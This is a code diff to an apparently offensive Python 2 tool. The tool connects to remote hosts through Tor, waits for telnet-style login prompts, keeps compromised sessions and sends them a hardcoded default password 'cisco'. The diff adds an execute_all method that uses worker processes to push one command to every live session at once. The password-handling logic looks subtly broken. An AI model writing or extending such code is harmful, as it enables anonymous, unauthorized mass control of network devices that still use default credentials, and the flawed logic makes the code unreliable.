@@ -4,6 +4,7 @@ import sys
 import time
 from sundries.execSql import *
 
+from multiprocessing import Queue , Process 
 from threading import Thread
 from tor import Tor
 from sundries import color
@@ -46,6 +47,7 @@ class Man(Tor,Exec):
 		for i in xrange(3):
 			try:
 				sock = Tor.newSock(self)
+				sock.settimeout(5.0)
 				sock.connect( ( host, port ) )
 				data = sock.recv(4096)
 				while 'login:' not in data and 'Password:' not in data and '>' not in data and '#' not in data:
@@ -70,16 +72,29 @@ class Man(Tor,Exec):
 			except Exception, e:
 				pass
 		return 0
-	def execute(self, sess, cmd):
-		print color.setcolor("[+] DATA FROM %s" % self.live[sess][0], color='red')
-		self.live[sess][1].send('%s\r\n' % cmd)
-		data = self.live[sess][1].recv(4096)
-		print '%s %s' % (color.setcolor('[+]',color='green'),data)
-		while '>' not in data and '#' not in data :
-			print data
-			if '--More--' in data:
-				self.live[sess][1].send('\r\n')
+	def execute(self, sess=0, cmd=None,worker=None,done=None):
+		if sess is not 0 and cmd is not None:
+			print color.setcolor("[+] DATA FROM %s" % self.live[sess][0], color='red')
+			self.live[sess][1].send('%s\r\n' % cmd)
 			data = self.live[sess][1].recv(4096)
+			print '%s %s' % (color.setcolor('[+]',color='green'),data)
+			while '>' not in data and '#' not in data:
+				print data
+				if '--More--' in data:
+					self.live[sess][1].send('\r\n')
+				data = self.live[sess][1].recv(4096)
+				if 'Password:' not in data:
+					pword = 'cisco'
+					self.live[sess][1].send(pword)
+			return True
+		elif worker is not None and done is not None:
+			try:
+				for i in iter(worker.get, 'STOP'):
+					self.execute(i[0], i[1])
+					done.put("DONE")
+			except Exception, e:
+				print e
+		return 1
 	def killSess(self, sess):
 		try:
 			print '%s Killing Session ID:%s' % (color.setcolor('[+]',color='red'), sess)
@@ -117,3 +132,20 @@ class Man(Tor,Exec):
 			for t in threads:t.start()
 		#	print "Killing threads"
 		#	for t in threads:t.join() 
+		return 1
+	def execute_all(self,cmd):
+		worker = Queue()
+		done = Queue()
+		processes = []
+		procs = 5
+
+		for i in self.live:
+			worker.put([i,cmd])
+		for w in xrange(procs):
+			p = Process(target=self.execute, args=(0, None, worker, done))
+			p.start()
+			processes.append(p)
+			worker.put('STOP')
+		for p in processes:
+			p.join()
+		return 1
